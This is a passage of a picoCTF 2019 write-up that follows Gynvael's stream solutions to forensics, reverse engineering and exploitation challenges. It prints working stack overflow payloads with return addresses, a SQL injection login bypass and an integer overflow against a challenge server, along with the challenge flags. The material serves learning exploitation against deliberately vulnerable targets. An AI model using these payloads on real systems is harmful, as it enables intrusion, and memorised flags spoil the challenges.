&gt;&gt;&gt; hex(int(p, 2))[2:-1] # Remove the '0x' at the beginning of the hex string and remove the 'L' at the end
&gt;&gt;&gt; (&quot;0&quot; + hex(int(p, 2))[2:-1]).decode(&quot;hex&quot;) # add a &quot;0&quot; as padding since it needs to be even length and then decode as hex
'\n\t\tpicoCTF\n\n\t\tSEE PUBLIC RECORDS &amp; BACKGROUND REPORT\n\t\t5000 Forbes Ave, Pittsburgh, PA 15213\n\t\tpicoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}\n\t\t'
</code></pre><h2 id="c0rrupt---forensics">c0rrupt - Forensics</h2>
<p>Gynvael decides to do another forensics problem and saves the binary exploitation one for later.</p>
<p>The file command just tells us the file is data.</p>
<pre><code class="language-console" data-lang="console">$ file mystery
mystery: data
</code></pre><p>Opening in a text editor reveals some strings like RGB, gAMA, etc. which tells us the file is probably a png.</p>
<p>Use Gynvael&rsquo;s brute zlib decompressor code at [https://github.com/gynvael/random-stuff/tree/master/brute_zlib]. This code will just try decompressing the zlib data in a png.</p>
<p>Just change <code>data, unused = DecompressStream(d[i:i+128])</code> to <code>data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a  large number</code> since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.</p>
<pre><code class="language-console" data-lang="console">$ python go.py ./mystery
Some data at 0000005b
Some data at 0000005d
Some data at 000003ff
Some data at 00000552
Some data at 00000907
...
$ ls -la
total 6880
drwxrwxrwx 1 root root    4096 May  6 15:29 .
drwxrwxrwx 1 root root    4096 May  6 15:21 ..
-rwxrwxrwx 1 root root 1431747 May  6 15:28 0000005b.bin
-rwxrwxrwx 1 root root 5399156 May  6 15:29 0000005d.bin
...
</code></pre><p>Notice that the <code>0000005d.bin</code> file is the largest, so it&rsquo;s probably the ones we want to look at. Change the extension to .data and use GIMP to look at the file.<br>
Open as Gray 8-bit and get the black dots to form a vertical line by increasing the width.
The dots are probably the number of filters which are part of each scanline/row of the image, so when they are aligned in a verticalish line, we should have the correct with of the image.</p>
<p>The image should look something like this:</p>
<pre><code>  .
   .
    .
     .
      .
       .
 . ..     ..    .....  ..                   .             . ...
 . . ..    .      .        .     ... . .      .    .             .
</code></pre><p>Set Image Type to RGB and you should see some legible text.<br>
Continue increasing the width and try to get the image more clear.</p>
<p>Gynvael says the zlib decompression is probably not an intended solution, but it&rsquo;s nice trick if there&rsquo;s a zlib stream like ZIP, GZIP, HTTP compression, or a png.</p>
<h2 id="m00nwalk---forensics">m00nwalk - Forensics</h2>
<p>Gynvael does another forensics challenge.</p>
<p>Listen to the .wav file. Somehow Gynvael figures out it&rsquo;s SSTV (Slow Scan TV).<br>
SSTV: protocol to send images from satellites.</p>
<p>Gynvael uses the <a href="http://users.belgacom.net/hamradio/rxsstv.htm">RX-SSTV</a> program and plays the .wav file to get the picture (using the Scottie1 option).</p>
<p>SSTV is something you learn from CTFs and should know for CTFs.</p>
<h2 id="overflow2---binary-exploitation">Overflow2 - Binary Exploitation</h2>
<p>gets() is the vulnerable function which means any character in our input except &lsquo;\n&rsquo; (on windows other characters would be disallowed like Ctrl-D)</p>
<p>We want to call flag() since that prints out the flag, but we see that it checks for function arguments.</p>
<p>We have to push the flag function&rsquo;s arguments onto the stack as well as overwrite the return address with the address of the flag function in order to execute the flag function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }

  fgets(buf,FLAGSIZE,f);
  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xDEADBEEF</span>)
    <span style="color:#66d9ef">return</span>;
  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xC0DED00D</span>)
    <span style="color:#66d9ef">return</span>;
  printf(buf);
}
</code></pre></div><p>Here&rsquo;s a diagram of what the stack should look like when the ret instruction is called (when vuln() returns):</p>
<pre><code>0x080485E6 # This is the address of flag(), the address we want to jump to
Saved EBP # We can fill this with junk (AAAA in this case). This is where the above function will go to when it returns
0xDEADBEEF # Argument 1
0xC0DED00D # Argument 2
</code></pre><pre><code>$ echo -e '\xE6\x85\x04\x08\x41\x41\x41\x41\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0'
</code></pre><p>We still need to add some characters at the beginning to overflow the buffer. The amount of characters will probably be larger than the buffer length.</p>
<pre><code>$ echo -e 'DDDDCCCCBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xE6\x85\x04\x08\x41\x41\x41\x41\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0' | ./vuln
Please enter your string:
DDDDCCCCBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ
picoCTF{arg5_and_r3turn5001d1db0}Segmentation fault (core dumped)
</code></pre><p>We needed BUFLENGTH + 12 characters.</p>
<h2 id="newoverflow-1---binary-exploitation">NewOverFlow-1 - Binary Exploitation</h2>
<h4 id="64-bit-exploitation">64-bit exploitation</h4>
<ul>
<li>8 bytes instead of 4 bytes</li>
<li>Calling convention (arguments are in registers sometimes)</li>
</ul>
<p>Pretty much the same thing as the 32 bit one.</p>
<p>Get the address of the flag:</p>
<pre><code class="language-console" data-lang="console">$ objdump -x vuln # Just display all the functions and things in the binary
...
0000000000000000       F *UND*  0000000000000000              fopen@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000601070 g     O .data  0000000000000000              .hidden __TMC_END__
0000000000400767 g     F .text  0000000000000065              flag
00000000004005c8 g     F .init  0000000000000000              _init
</code></pre><p>We see that the address of flag() is 0x0000000000400767. The null bytes wont&rsquo; affect gets() since gets() only ends at a newline.</p>
<p>Our exploit format:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # Padding to reach the saved return address (Right now we don't know how many A's to use to pad it)
\x67\x07\x40\x00\x00\x00\x00\x00 # Address of flag() in little endian which overwrites whatever saved return address there was
</code></pre><p>Previously, we just guessed how much padding to add to overwrite the return addres, now Gynvael looks at the disassembly of the binary to see if we can calculate how many A&rsquo;s we need to overwrite the return address with the address of flag.</p>
<p>Note: In the stream Gynvael looks at the flag() function disasssembly by mistake when he should in fact look at the vuln() function&rsquo;s disassembly to make the exploit since that&rsquo;s the function that calls gets().</p>
<pre><code class="language-console" data-lang="console">$ objdump -Mintel -d vuln
...
00000000004007cc &lt;vuln&gt;:
  4007cc:       55                      push   rbp
  4007cd:       48 89 e5                mov    rbp,rsp
  4007d0:       48 83 ec 40             sub    rsp,0x40
  4007d4:       48 8d 45 c0             lea    rax,[rbp-0x40]
  4007d8:       48 89 c7                mov    rdi,rax
  4007db:       b8 00 00 00 00          mov    eax,0x0
  4007e0:       e8 4b fe ff ff          call   400630 &lt;gets@plt&gt;
  4007e5:       90                      nop
  4007e6:       c9                      leave
  4007e7:       c3                      ret
...
</code></pre><p>As we can see from the disassembly above, when the <code>ret</code> instruction is called, the stack will look something like this:</p>
<pre><code>[saved return address]
[saved rbp]
[0x40 bytes for buf]
</code></pre><p>So we need 64 A&rsquo;s to overwrite the buffer and then another 8 A&rsquo;s to overwrite the saved rbp for a total of 72. Then we can overwrite the saved return address with the address of flag().</p>
<p>Exploit</p>
<pre><code class="language-console" data-lang="console">$ echo -e &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00&quot; | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
</code></pre><p>However, when the above, it doesn&rsquo;t seem to work. Let&rsquo;s run it in gdb:</p>
<pre><code class="language-console" data-lang="console">$ echo -e &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00&quot; &gt; ~/asdf # save the exploit to a file
$ gdb ./vuln
(gdb) r &lt; ~/asdf # Run the program in gdb with the file's contents as our input
Starting program: /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln &lt; ~/asdf
Welcome to 64-bit. Give me a string that gets you the flag:
'flag.txt' missing in the current directory!
[Inferior 1 (process 2882877) exited normally]
</code></pre><p>It looks like the exploit actually worked in gdb. When you run a program using gdb it drops the permissions from the original binary which is why you have the program couldn&rsquo;t find flag.txt. The exploit worked in gdb but not outside of it because running a program in gdb changes the environment and program a little bit. Running the exploit locally also succeeds, but running on the shell server outside of gdb fails because there might be slight differences there.</p>
<p>To confirm that we&rsquo;re actually overwriting the return address on the shell server outside of gdb, we can look for an instruction/function in the binary that will allow us to see if we have control of the return address. Gynvael looks for the 0xEBFE or infinite loop instruction in the binary, but there isn&rsquo;t one. Instead we can try calling <code>puts(&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;);</code> since that will show us if we overwrite the return address. This technique is a common strategy for confirming that we have control of the return address.</p>
<p>These two lines are what we want called to call the puts() function in main().</p>
<pre><code class="language-console" data-lang="console">$ objdump -Mintel -d vuln
...
  400834:       48 8d 3d ed 00 00 00    lea    rdi,[rip+0xed]        # 400928 &lt;_IO_stdin_used+0x48&gt;
  40083b:       e8 b0 fd ff ff          call   4005f0 &lt;puts@plt&gt;
...
</code></pre><p>We want to call address 0x400834 since we need to load the string into rdi as a parameter before calling puts. Use that as the return address we&rsquo;re overwriting.</p>
<pre><code class="language-console" data-lang="console">$ echo -e &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x08\x40\x00\x00\x00\x00\x00&quot; | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Welcome to 64-bit. Give me a string that gets you the flag:
Bus error (core dumped)
</code></pre><p>We can see that the welcome message was printed twice, indidcating that we did indeed call puts by overwriting the stored return address on the stack. This confirms that we had the right amount of padding to overwrite the return address even though it seems ovewriting the return address with the address of flag() didn&rsquo;t work.</p>
<p>The next technique we can try is using the address instruction after the start of flag() instead of the address of flag().</p>
<pre><code class="language-assembly" data-lang="assembly">0000000000400767 &lt;flag&gt;:
  400767:       55                      push   rbp # Instead of calling this
  400768:       48 89 e5                mov    rbp,rsp # we can maybe call this address
  40076b:       48 83 ec 50             sub    rsp,0x50 # or maybe even this one
  40076f:       48 8d 35 72 01 00 00    lea    rsi,[rip+0x172]        # 4008e8 &lt;_IO_stdin_used+0x8&gt;
</code></pre><p>Let&rsquo;s try 0x400768 instead of 0x400768 (address of flag()).</p>
<pre><code class="language-console" data-lang="console">$ echo -e &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x68\x07\x40\x00\x00\x00\x00\x00&quot; | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}
Segmentation fault (core dumped)
</code></pre><p>For some reason the program was crashing on the <code>push rbp</code> instruction (probably due to stack alignment). Later Gynvael says that Canonical compiled the new Ubuntu kernel with some flags that would make a program crash if the stack was misaligned.</p>
<h2 id="like1000---forensics">like1000 - Forensics</h2>
<p>Gynvael fails figure out how to use 7zip, then proceeds to try extracting the tar with the following script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
<span style="color:#f92672">import</span> os
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1000</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;tar -xf </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">.tar&#39;</span> <span style="color:#f92672">%</span> i)
  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;filler.txt&#34;</span>) <span style="color:#66d9ef">as</span> f:
    <span style="color:#66d9ef">print</span>(f<span style="color:#f92672">.</span>read())
</code></pre></div><p>The above script <em>does</em> work in getting the flag, but tar files are sort of just files concatenated together, so there&rsquo;s no need for the above script to process the tar in a recurisve way.</p>
<p>Gynvael just opens up a hex editor and finds the magic header for the PNG (89 50 4e 47). He then deletes everything before that header and saves the file. Open in an image viewer as a png and there&rsquo;s the flag.</p>
<h2 id="vault-door-4---reverse-engineering">vault-door-4 - Reverse Engineering</h2>
<p>Just print the myBytes array:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span> bytearray([<span style="color:#ae81ff">106</span> , <span style="color:#ae81ff">85</span>  , <span style="color:#ae81ff">53</span>  , <span style="color:#ae81ff">116</span> , <span style="color:#ae81ff">95</span>  , <span style="color:#ae81ff">52</span>  , <span style="color:#ae81ff">95</span>  , <span style="color:#ae81ff">98</span>  ,
            <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x5f</span>,
            <span style="color:#ae81ff">0142</span>, <span style="color:#ae81ff">0131</span>, <span style="color:#ae81ff">0164</span>, <span style="color:#ae81ff">063</span> , <span style="color:#ae81ff">0163</span>, <span style="color:#ae81ff">0137</span>, <span style="color:#ae81ff">062</span> , <span style="color:#ae81ff">066</span> ,
            <span style="color:#e6db74">&#39;7&#39;</span> , <span style="color:#e6db74">&#39;e&#39;</span> , <span style="color:#e6db74">&#39;0&#39;</span> , <span style="color:#e6db74">&#39;3&#39;</span> , <span style="color:#e6db74">&#39;d&#39;</span> , <span style="color:#e6db74">&#39;1&#39;</span> , <span style="color:#e6db74">&#39;1&#39;</span> , <span style="color:#e6db74">&#39;6&#39;</span>])
</code></pre></div><h2 id="irish-name-repo-1---web-exploitation">Irish-Name-Repo 1 - Web Exploitation</h2>
<p>Test for SQL injection by putting <code>' &quot;-</code> in the username. This leads to a <code>HTTP ERROR 500</code> which tells us it&rsquo;s probably vulnerable to SQL injection.</p>
<p>When looking at the source, we see a hidden input field, so we set debug to 1</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;debug&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>&gt;
</code></pre></div><p>When we sent the same payload as before (<code>' &quot;-</code>), we get some debug output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SQL</span> query: <span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#34;-&#39; AND password=&#39;&#39;
</span></code></pre></div><p>We want the query to look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- 
</span></code></pre></div><p>The space after <code>--</code> matters since some versions of SQL need it there.
Send the following as the username:<code>' OR 1=1 -- </code></p>
<h2 id="flag_shop---general-skills">flag_shop - General Skills</h2>
<p>This is the piece of code we want to execute to display the flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span>(account_balance <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100000</span>) {
  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span>(f <span style="color:#f92672">==</span> NULL){
      printf(<span style="color:#e6db74">&#34;flag not found: please run this on the server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
      exit(<span style="color:#ae81ff">0</span>);
    }
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
  fgets(buf, <span style="color:#ae81ff">63</span>, f);
  printf(<span style="color:#e6db74">&#34;YOUR FLAG IS: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf);
}
</code></pre></div><p>We need <code>account_balance</code>  to be greater than $100,000 to &ldquo;buy&rdquo; the flag, but unfortunately we only have $1100 in our account.</p>
<p>Luckily <code>account_balance</code> is a signed integer, so <code>if(account_balance &gt; 100000)</code> is vulnerable to an integer overflow/integer underflow attack.</p>
<p>If we keep on subtracting from our account balance by buying a bunch of the fake flags, we can eventually get account_balance to be greater than $100,000.</p>
<p>If we buy more than around 2 billion worth of flags, the worth of the flags will wrap around to around negative 2 billion. Then when we subtract a negative amount of money from our balance, it actually adds all that money to our account.</p>
<p>Each &ldquo;fake&rdquo; flag costs 900 to buy, so we need to buy around 2386092 fake flags since 2147483647/900=2386092. But in order to get <em>past</em> 2147483647, we need more than that. We also need to take the intial balance of 1100 into account as well.  So we have to buy around 2386095 fake flags to get our account balance to a very large positive number. Then with that balance we can buy the real flag.</p>
<pre><code class="language-console" data-lang="console">$ nc 2019shell1.picoctf.com 63894
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_818a7f84}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit
</code></pre><h2 id="asm1---reverse-engineering">asm1 - Reverse Engineering</h2>
<p>We get this:</p>
<pre><code class="language-assembly" data-lang="assembly">asm1:
        &lt;+0&gt;:   push   ebp
        &lt;+1&gt;:   mov    ebp,esp
        &lt;+3&gt;:   cmp    DWORD PTR [ebp+0x8],0x767
        &lt;+10&gt;:  jg     0x512 &lt;asm1+37&gt;
        &lt;+12&gt;:  cmp    DWORD PTR [ebp+0x8],0x1f3
        &lt;+19&gt;:  jne    0x50a &lt;asm1+29&gt;
        &lt;+21&gt;:  mov    eax,DWORD PTR [ebp+0x8]
        &lt;+24&gt;:  add    eax,0xb
        &lt;+27&gt;:  jmp    0x529 &lt;asm1+60&gt;
        &lt;+29&gt;:  mov    eax,DWORD PTR [ebp+0x8]
        &lt;+32&gt;:  sub    eax,0xb
        &lt;+35&gt;:  jmp    0x529 &lt;asm1+60&gt;
        &lt;+37&gt;:  cmp    DWORD PTR [ebp+0x8],0xcde
        &lt;+44&gt;:  jne    0x523 &lt;asm1+54&gt;
        &lt;+46&gt;:  mov    eax,DWORD PTR [ebp+0x8]
        &lt;+49&gt;:  sub    eax,0xb
        &lt;+52&gt;:  jmp    0x529 &lt;asm1+60&gt;
        &lt;+54&gt;:  mov    eax,DWORD PTR [ebp+0x8]
        &lt;+57&gt;:  add    eax,0xb
        &lt;+60&gt;:  pop    ebp
        &lt;+61&gt;:  ret
</code></pre><p>Since this is ctf challenge, Gynvael says to just run it unless you&rsquo;re learning asm.</p>
<p>Fix the jumps, get rid of the numbers, and get rid of PTR so it compiles:</p>
<pre><code class="language-assembly" data-lang="assembly">[bits 32]
asm1:

push   ebp
mov    ebp,esp
cmp    DWORD [ebp+0x8],0x767
jg     asm1+37
cmp    DWORD [ebp+0x8],0x1f3
jne    asm1+29
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
cmp    DWORD [ebp+0x8],0xcde
jne    asm1+54
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
pop    ebp
ret    
</code></pre><p>Push the argument and a junk return address onto the stack</p>
<pre><code class="language-assembly" data-lang="assembly">[bits 32] ; 32 bit since esp instead of rsp
asm1:
push   0x529
push   0x41414141
push   ebp
mov    ebp,esp
cmp    DWORD [ebp+0x8],0x767
jg     asm1+37
cmp    DWORD [ebp+0x8],0x1f3
jne    asm1+29
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
cmp    DWORD [ebp+0x8],0xcde
jne    asm1+54
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
pop    ebp
ret    
</code></pre><p>Add 10 to every asm+offset since the two push instruction we added are 10 bytes</p>
<pre><code class="language-assembly" data-lang="assembly">[bits 32] ; 32 bit since esp instead of rsp
asm1:
push   0x529
push   0x41414141
push   ebp
mov    ebp,esp
cmp    DWORD [ebp+0x8],0x767
jg     asm1+37+10
cmp    DWORD [ebp+0x8],0x1f3
jne    asm1+29+10
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
jmp    asm1+60+10
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60+10
cmp    DWORD [ebp+0x8],0xcde
jne    asm1+54+10
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60+10
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
pop    ebp
ret    
</code></pre><p>Compile and run with <a href="https://github.com/gynvael/asmloader">asmloader (32 bit version)</a>:</p>
<pre><code class="language-console" data-lang="console">$ nasm test.S
$ gdb ./asmloader
(gdb) run test
...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i r eax
eax            0x51e               1310
</code></pre><p>The returned value is stored in eax per <a href="https://www.agner.org/optimize/calling_conventions.pdf">calling conventions</a></p>
<h2 id="newoverflow-2---binary-exploitation">NewOverflow-2 - Binary Exploitation</h2>
<p>We see the call to gets() in the vuln() function is the vulnerability in the program once again.</p>
<p>The flag() function seems to be put in the program by mistake.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;&#39;flag.txt&#39; missing in the current directory!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
</code></pre></div><p>In a real ctf, Gynvael says to just take the easiest approach and just call this function.
However, in the stream, Gynvael decides to call the win_fn() function since that&rsquo;s probably the intentional solution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win_fn</span>() {
  <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">48</span>];
  FILE <span style="color:#f92672">*</span>file;
  file <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;&#39;flag.txt&#39; missing in the current directory!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }

  fgets(flag, <span style="color:#66d9ef">sizeof</span>(flag), file);
  <span style="color:#66d9ef">if</span> (win1 <span style="color:#f92672">&amp;&amp;</span> win2) {
    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, flag);
    <span style="color:#66d9ef">return</span>;
  }
  <span style="color:#66d9ef">else</span> {
    printf(<span style="color:#e6db74">&#34;Nope, not quite...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
}
</code></pre></div><p>In order to use the win_fn() function, we need to set the global <code>win1</code> and <code>win2</code> variables to true.</p>
<p>We see that win1 can be set using the following function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win_fn1</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg_check) {
  <span style="color:#66d9ef">if</span> (arg_check <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xDEADBEEF</span>) {
    win1 <span style="color:#f92672">=</span> true;
  }
}
</code></pre></div><p>and win2 can be set using this function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win_fn2</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg_check1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg_check2, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg_check3) {
  <span style="color:#66d9ef">if</span> (win1 <span style="color:#f92672">&amp;&amp;</span> \
      arg_check1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xBAADCAFE</span> <span style="color:#f92672">&amp;&amp;</span> \
      arg_check2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xCAFEBABE</span> <span style="color:#f92672">&amp;&amp;</span> \
      arg_check3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xABADBABE</span>) {
    win2 <span style="color:#f92672">=</span> true;
  }
}
</code></pre></div><p>We <em>could</em> actually pass the right arguments to the above functions and then call the functions to try and set the win1 and win2 global variables, but it&rsquo;s much easier to just skip the if cases and jump directly to the <code>win1 = true;</code> and <code>win2 = true;</code>.</p>
<p>Use the checksec tool to see what mitigations are in place in the binary:</p>
<pre><code class="language-console" data-lang="console">$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified   Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     No       0           3            vuln
</code></pre><p><code>NX enabled</code> means that we can&rsquo;t execute anything on the stack, but there&rsquo;s no PIE/ASLR (addresses that we see in memory are the addresses that are used in memory). This means ROP (Return Oriented Programming) will probably have to be used.</p>
